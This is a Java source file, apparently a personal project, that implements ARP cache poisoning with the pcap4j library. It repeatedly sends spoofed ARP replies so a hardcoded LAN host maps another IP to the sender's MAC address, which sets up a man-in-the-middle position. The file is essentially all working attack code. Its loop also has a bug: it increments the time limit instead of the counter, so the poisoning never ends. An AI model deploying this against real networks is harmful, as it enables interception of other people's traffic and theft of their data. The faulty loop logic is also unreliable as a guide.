import org.pcap4j.core.*;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MITM{

    //built based off sendarprequest sample https://github.com/kaitoy/pcap4j/blob/v1/pcap4j-sample/src/main/java/org/pcap4j/sample/SendArpRequest.java

    public static void main(String[] args) throws PcapNativeException, IOException, NotOpenException {
        //temporary fix to force pcap4j to use Npcap instead of wpcap
        System.setProperty("jna.library.path", "C:/Windows/System32/Npcap/");

        String targetIP = "192.168.0.118";
        String spoofedIP = "192.168.0.104";

        poisonArp(targetIP, spoofedIP, 30);

    }

    /**
     * Poisons a target's arp cache with a spoofed ip address
     * @param targetIP The target to poison
     * @param spoofedIP The ip to impersonate
     * @param timeInSeconds The time in seconds to run the poison
     */
    private static void poisonArp(String targetIP, String spoofedIP, int timeInSeconds){
        try {
            poisonArp(InetAddress.getByName(targetIP), InetAddress.getByName(spoofedIP), timeInSeconds);
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Poisons a target's arp cache with a spoofed ip address
     * @param targetIP The target to poison
     * @param spoofedIP The ip to impersonate
     * @param timeInSeconds The time in seconds to run the poison
     */
    private static void poisonArp(InetAddress targetIP, InetAddress spoofedIP, int timeInSeconds){
        int timer = 0;

        PcapNetworkInterface networkInterface = null;
        try {
            networkInterface = MacAddressResolver.getAvailableNetworkInterface();
        } catch (PcapNativeException e) {
            System.out.println("Unable to find viable network interface");
            e.printStackTrace();
        }

        if(networkInterface == null){
            return;
        }

        MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());

        MacAddress targetMac = MacAddressResolver.resolveMacAddress(targetIP);

        PcapHandle handle;
        try {
            handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
        } catch (PcapNativeException e) {
            throw new RuntimeException(e);
        }

        Packet posionedArpPacket = arpHelper.createArpPacket(spoofedIP, targetIP, sourceMac, targetMac, ArpOperation.REPLY);

        while(timer < timeInSeconds){

            if(sendSpoofedArp(posionedArpPacket, networkInterface, handle)){
                System.out.println("Arp poisoned - Target:" + targetIP.getHostAddress() + " Spoof:" + spoofedIP.getHostAddress() + " TargetMac: " + targetMac.toString() + " SourceMac: " + sourceMac.toString());
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            timeInSeconds++;
        }

    }

    /**
     * Sends an Arp reply packet across an interface
     * @param posionedArpPacket Arp Packet to send
     * @param networkInterface Interface to send across
     * @param handle PCapHandle. Requires handle to be open.
     * @return True if packet sent successfully
     */
    private static boolean sendSpoofedArp(Packet posionedArpPacket, PcapNetworkInterface networkInterface, PcapHandle handle) {
        if (networkInterface == null) {
            return false;
        }
        if (!handle.isOpen()){
            return false;
        }
        try {
            handle.sendPacket(posionedArpPacket);
        } catch (PcapNativeException e) {
            throw new RuntimeException(e);
        } catch (NotOpenException e) {
            throw new RuntimeException(e);
        }

        System.out.println("Arp sent");
        return true;
    }
}